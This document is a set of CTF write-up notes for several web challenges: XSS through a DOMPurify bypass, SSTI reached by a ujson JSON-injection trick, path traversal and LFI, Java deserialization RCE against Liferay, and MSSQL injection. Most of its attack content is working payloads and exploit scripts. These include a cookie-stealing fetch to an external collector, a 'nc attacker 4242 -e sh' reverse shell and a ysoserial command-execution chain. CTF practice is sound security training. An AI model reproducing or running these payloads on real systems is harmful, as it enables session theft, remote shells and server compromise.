# X Éc Éc
#xss #dompurify 
### Overview
Notes app, that sanitizes input with `domPurify` in the **server**.
### Exploitation
```
<svg><a><foreignobject><a><table><a></table><style><!--</style></svg><a id="-><img src onerror='fetch(`//estpahsh.requestrepo.com?c=${document.cookie}`)'>">.
```
---------------------------------------
# Another One
#json #ssti 
### Road to flag
The flag has a random name in `/app` -> RCE
### Code review
In the admin route there's an SSTI:
```python
@app.route('/render', methods=['POST'])
def dynamic_template():
    token = request.cookies.get('jwt_token')
    if token:
        try:
            decoded = jwt.decode(token, app.config['SECRET_KEY'], algorithms=['HS256'])
            role = decoded.get('role')

            if role != "admin":
                return jsonify(message="Admin only"), 403

            data = request.get_json()
            template = data.get("template")
            rendered_template = render_template_string(template)
            
            return jsonify(message="Done")

        except jwt.ExpiredSignatureError:
            return jsonify(message="Token has expired."), 401
        except jwt.InvalidTokenError:
            return jsonify(message="Invalid JWT."), 401
        except Exception as e:
            return jsonify(message=str(e)), 500
    else:
        return jsonify(message="Where is your token?"), 401
```
But how to be admin?
The app uses `ujson`, not the standard json lib.
Registration route:
```python
@app.route('/register', methods=['POST'])
def register():
    json_data = request.data
    if "admin" in json_data:
        return jsonify(message="Blocked!")
    data = ujson.loads(json_data)
    username = data.get('username')
    password = data.get('password')
    role = data.get('role')
    
    if role !="admin" and role != "user":
        return jsonify(message="Never heard about that role!")
    
    if username == "" or password == "" or role == "":
        return jsonify(messaage="Lack of input")
    
    if register_db(connection, username, password, role):
        return jsonify(message="User registered successfully."), 201
    else:
        return jsonify(message="Registration failed!"), 400
```
### Exploitation
1. JSON injection
```
POST /register
{"username":"sebb","password":"sebb","role":"adm\ud888in"}
```
2. SSTI
```
POST render
{"template":"{{ self.__init__.__globals__.__builtins__.__import__('os').system('nc attacker 4242 -e sh') }}"}
```
-------------------------------------
# S1mple
#docker #lfi #php #fileupload #access-control
Only a Dockerfile is provided.
1. Download the container locally to read the sources
2. `web.conf` misconfig -> Path traversal `/webcontent-/usr/share/...`
3. in `/usr/share` there's a service that allows to upload file -> upload `exploit.html` containing php code that reads `/.htpasswd`
4. Access `/admin.php%3f`
5. LFI into the admin panel to include `exploit.html` -> read `.htpasswd`
-------------------------------------
# niceray
#deserialization #java #rce
### Road to flag
The flag has a random name in `/` -> RCE
### Exploitation
https://nguyendt.hashnode.dev/lpe-15538

```python
import requests
import os
import base64

URL = "http://ip:8080"

# 1. execution: ls / > /opt/liferay-portal-6.2-ce-ga3/jboss-7.1.1/standalone/deployments/welcome-theme.war/js/main.js
# 2. get flag filename from /js/main.js
# 3. execution: cat FLAG_RANDOM_NAME > /opt/liferay-portal-6.2-ce-ga3/jboss-7.1.1/standalone/deployments/welcome-theme.war/js/main.js
# 4. get the flag from /js/main.js
# Note: /js/main.js gets cached, use a cachebuster
cmd = "ls / > /opt/liferay-portal-6.2-ce-ga3/jboss-7.1.1/standalone/deployments/welcome-theme.war/js/main.js"

os.system(f"java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED -jar ysoserial-all.jar CommonsCollections6 \"bash -c {{echo,${base64.b64encode(cmd).encode("utf-8")}}}|{{base64,-d}}|bash\" > payload.bin")

requests.post(URL + "/api////liferay", data = open("payload.bin", "rb"))
```

`ISITDTU{why_why_why????????046f0d87baf17c101fda8eef58c63fc8}`

------------------
## hihi
#deserialization #ssti #filter-bypass 
### Exploit
`Main.java`
```java
import com.isitdtu.hihi.Users;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.Base64;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

class Main {
    public static void main(String[] args) throws Exception {
        Users originalObject = new Users("${date.class.forName('java.lang.Runtime').getRuntime().exec('cat /app/flag_randomname').getInputStream().readAllBytes()}");
        String serializedObject = serialize(originalObject);
        try {
            submitPostRequest(serializedObject);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static String serialize(Serializable obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream(512);
        try (ObjectOutputStream out = new ObjectOutputStream(baos)) {
            out.writeObject(obj);
        }
        return Base64.getEncoder().encodeToString(bytesToHex(baos.toByteArray()).getBytes());
    }

    private static <T> T deserialize(String base64SerializedObj) throws Exception {
        try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(base64SerializedObj)))) {
            @SuppressWarnings("unchecked")
            T obj = (T) in.readObject();
            return obj;
        }
    }

    public static String bytesToHex(byte[] bytes) {
        StringBuilder hexString = new StringBuilder();
        for (byte b : bytes) {
            String hex = Integer.toHexString(0xFF & b);
            if (hex.length() < 2) {
                hexString.append('0');
            }
            hexString.append(hex);
        }
        return hexString.toString();
    }

    public static void submitPostRequest(String paramValue) {
        try {
            String encodedParamValue = URLEncoder.encode(paramValue, "UTF-8");
            String fullUrl = "http://213.35.127.196:8083?data=" + encodedParamValue;
            URL url = new URL(fullUrl);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            String requestBody = "additionalParam=value"; // Add additional parameters if required
            try (OutputStream os = connection.getOutputStream()) {
                os.write(requestBody.getBytes());
                os.flush();
            }
            int responseCode = connection.getResponseCode();
            System.out.println("Response Code: " + responseCode);
            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();
            System.out.println("Response: " + response.toString());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
`Users.java`
```java
package com.isitdtu.hihi;
import java.io.Serializable;

public class Users implements Serializable {
    private String name;
    private static final long serialVersionUID = 8107928321213067187L;
    
    public Users(String name) {
        this.name = name;
    }
}
```

`ISITDTU{We1come_t0_1s1tDTU_CTF}`

---------------------------------
## Hero
#sqli #filter-bypass #mssql
### Description
I'm too busy with work to create a hard challenge, so here is an easy one. Enjoy and get free points from it!
### Overview
Simple site with 3 pages.
### Exploitation
In `/genZ` there's a sqli in the `id` param.
In a page there's an error `This feature has been removed; please wait for an upgrade: Incorrect syntax near the keyword 'null'.` -> mssql

It can be exploited like [this](https://cyku.tw/no-database-mssql-injection/)